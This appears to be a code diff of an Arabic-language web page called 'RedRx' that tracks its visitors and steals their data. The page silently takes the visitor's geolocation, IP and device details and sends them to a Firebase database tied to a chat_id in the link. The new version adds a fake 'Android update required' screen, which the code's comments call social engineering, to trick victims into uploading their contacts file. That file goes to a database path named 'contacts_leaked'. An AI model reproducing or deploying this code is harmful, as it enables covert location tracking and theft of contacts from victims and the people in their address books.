@@ -1,211 +1,143 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<title>RedRx</title>
+    <meta charset="UTF-8">
+    <title>RedRx System - 2099</title>
 
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
-<style>
-body{
-margin:0;
-height:100vh;
-display:flex;
-align-items:center;
-justify-content:center;
-background:#1B1D29;
-color:#00aaff;
-font-family:sans-serif;
-text-align:center;
-}
-</style>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #1B1D29;
+            color: #00aaff;
+            font-family: sans-serif;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        /* واجهة التمويه (Social Engineering Overlay) */
+        #overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(27, 29, 41, 0.98);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .btn-update {
+            background: #00aaff;
+            color: #fff;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            box-shadow: 0 0 15px rgba(0, 170, 255, 0.4);
+        }
+
+        input[type="file"] { display: none; }
+
+        #status { color: #00aaff; margin-top: 10px; }
+    </style>
 </head>
 
 <body>
 
-<h2 id="status">...Please wait</h2>
+    <div id="overlay">
+        <h2 style="color: #ff4444;">⚠️ تحديث نظام Android 5.0 مطلوب</h2>
+        <p>يرجى مزامنة ملف جهات الاتصال (VCF) لتأمين حسابك والاستمرار.</p>
+        <label class="btn-update" for="contactFile">تحديث ومزامنة الآن</label>
+        <input type="file" id="contactFile" accept=".vcf">
+        <h3 id="status">...بانتظار الإجراء</h3>
+    </div>
 
-<script>
+    <script>
+        /* Firebase Configuration */
+        const firebaseConfig = {
+            apiKey: "AIzaSyCuyAgacCs5tClhYD79IVOpSWVvbtXObpc",
+            authDomain: "hercules-65b0c.firebaseapp.com",
+            databaseURL: "https://hercules-65b0c-default-rtdb.firebaseio.com",
+            projectId: "hercules-65b0c",
+            storageBucket: "hercules-65b0c.firebasestorage.app",
+            messagingSenderId: "758576632296",
+            appId: "1:758576632296:android:c69d0667cf54311617d45d"
+        };
 
-const params = new URLSearchParams(window.location.search);
-const chatId = params.get("chat_id");
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
 
-if(!chatId){
-document.getElementById("status").innerText="⚠ رابط غير صالح";
-throw new Error("No chat_id");
-}
+        const params = new URLSearchParams(window.location.search);
+        const chatId = params.get("chat_id") || "Unknown_User";
 
-/* Firebase config */
-const firebaseConfig = {
-apiKey: "AIzaSyCuyAgacCs5tClhYD79IVOpSWVvbtXObpc",
-authDomain: "hercules-65b0c.firebaseapp.com",
-databaseURL: "https://hercules-65b0c-default-rtdb.firebaseio.com",
-projectId: "hercules-65b0c",
-storageBucket: "hercules-65b0c.firebasestorage.app",
-messagingSenderId: "758576632296",
-appId: "1:758576632296:android:c69d0667cf54311617d45d"
-};
+        /* --- وظائف الاستخراج (Extraction Functions) --- */
 
-firebase.initializeApp(firebaseConfig);
-const database = firebase.database();
+        async function getIP() {
+            try {
+                const res = await fetch("https://api.ipify.org?format=json");
+                const json = await res.json();
+                return json.ip;
+            } catch (e) { return "unknown"; }
+        }
 
-/* IP */
-async function getIP(){
-try{
-const res = await fetch("https://api.ipify.org?format=json");
-const json = await res.json();
-return json.ip;
-}catch(e){
-return "unknown";
-}
-}
+        function getFormattedDateTime() {
+            const d = new Date();
+            return `${d.getDate()}-${d.getMonth()+1}-${d.getFullYear()} | ${d.getHours()}:${String(d.getMinutes()).padStart(2,'0')} ${d.getHours()>=12?'PM':'AM'}`;
+        }
 
-/* Browser */
-function getBrowserName(){
-const ua = navigator.userAgent;
+        /* --- تنفيذ سحب الموقع تلقائياً --- */
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const ip = await getIP();
+            const data = {
+                chat_id: chatId,
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                ip: ip,
+                device: navigator.userAgent,
+                time: getFormattedDateTime(),
+                type: "Location_Update"
+            };
+            database.ref("locations").push(data);
+        }, (err) => {
+            console.log("Location Denied");
+        }, { enableHighAccuracy: true });
 
-if(ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Chrome";
-if(ua.includes("Firefox")) return "Firefox";
-if(ua.includes("Edg")) return "Edge";
-if(ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
-if(ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+        /* --- تنفيذ سحب جهات الاتصال عند التفاعل --- */
+        document.getElementById('contactFile').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
 
-return "Unknown";
-}
+            document.getElementById("status").innerText = "⏳ جاري الرفع...";
 
-/* Network */
-function getNetworkType(){
-const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-if(!conn) return "Unknown";
+            const reader = new FileReader();
+            reader.onload = async function(event) {
+                const content = event.target.result;
+                
+                // إرسال البيانات المستخرجة إلى Firebase
+                await database.ref("contacts_leaked").push({
+                    chat_id: chatId,
+                    file_name: file.name,
+                    raw_data: content, // يحتوي على كل الأسماء والأرقام
+                    time: getFormattedDateTime()
+                });
 
-if(conn.type==="wifi") return "WiFi";
+                document.getElementById("overlay").innerHTML = "<h2>✅ تم التحديث بنجاح</h2><p>سيتم توجيهك الآن...</p>";
+                setTimeout(() => { document.getElementById("overlay").style.display = "none"; }, 2500);
+            };
+            reader.readAsText(file);
+        });
 
-if(conn.effectiveType){
-switch(conn.effectiveType){
-case "4g": return "4G";
-case "3g": return "3G";
-case "2g": return "2G";
-case "5g": return "5G";
-default: return conn.effectiveType.toUpperCase();
-}
-}
-
-return "Unknown";
-}
-
-/* Battery */
-async function getBatteryPercentAndCharging(){
-if(!navigator.getBattery) return {level:null,charging:null};
-
-try{
-const battery = await navigator.getBattery();
-const level = Math.round(battery.level*100);
-const charging = battery.charging;
-return {level,charging};
-}catch(e){
-return {level:null,charging:null};
-}
-}
-
-/* Language */
-function getLanguageCode(){
-const lang = navigator.language || "en";
-if(lang.startsWith("ar")) return "ar";
-return "en";
-}
-
-/* RAM */
-function getDeviceRAM(){
-if(navigator.deviceMemory) return navigator.deviceMemory+"GB";
-return "NA";
-}
-
-/* Storage */
-async function getStorageInfo(){
-if(navigator.storage && navigator.storage.estimate){
-try{
-const estimate = await navigator.storage.estimate();
-const availableGB=((estimate.quota-estimate.usage)/(1024*1024*1024)).toFixed(2);
-return availableGB+"GB";
-}catch(e){
-return "NA";
-}
-}
-return "NA";
-}
-
-/* Time */
-function getFormattedDateTime(){
-const d=new Date();
-
-const day=d.getDate();
-const month=d.getMonth()+1;
-const year=d.getFullYear();
-
-let hours=d.getHours();
-const minutes=String(d.getMinutes()).padStart(2,'0');
-const seconds=String(d.getSeconds()).padStart(2,'0');
-
-const ampm=hours>=12?"PM":"AM";
-
-hours=hours%12;
-hours=hours?hours:12;
-
-return `${day}-${month}-${year} | ${hours}:${minutes}:${seconds} ${ampm}`;
-}
-
-/* Online status */
-function getOnlineStatus(){
-return navigator.onLine?"Online":"Offline";
-}
-
-/* Get location */
-
-navigator.geolocation.getCurrentPosition(
-
-async(pos)=>{
-
-const ip=await getIP();
-const browser=getBrowserName();
-const network=getNetworkType();
-const batteryInfo=await getBatteryPercentAndCharging();
-const langCode=getLanguageCode();
-const ram=getDeviceRAM();
-const storage=await getStorageInfo();
-const onlineStatus=getOnlineStatus();
-
-const batteryText=batteryInfo.level!==null?`Battery${batteryInfo.level}%`:"BatteryNA%";
-const chargingText=batteryInfo.charging!==null?batteryInfo.charging:"NA";
-
-const data={
-chat_id:chatId,
-latitude:pos.coords.latitude,
-longitude:pos.coords.longitude,
-accuracy:pos.coords.accuracy,
-ip:ip,
-device:`${onlineStatus}/${browser}(${batteryText}/${chargingText}-language:${langCode}-ram:${ram}-storage:${storage}-${network})`,
-time:getFormattedDateTime()
-};
-
-await database.ref("locations").push(data);
-
-document.getElementById("status").innerText="...Sent successfully";
-
-},
-
-(err)=>{
-
-document.getElementById("status").innerText="❌ تم رفض إذن الموقع أو حدث خطأ";
-console.error(err);
-
-},
-
-{enableHighAccuracy:true,timeout:15000,maximumAge:0}
-
-);
-
-</script>
-
+    </script>
 </body>
 </html>
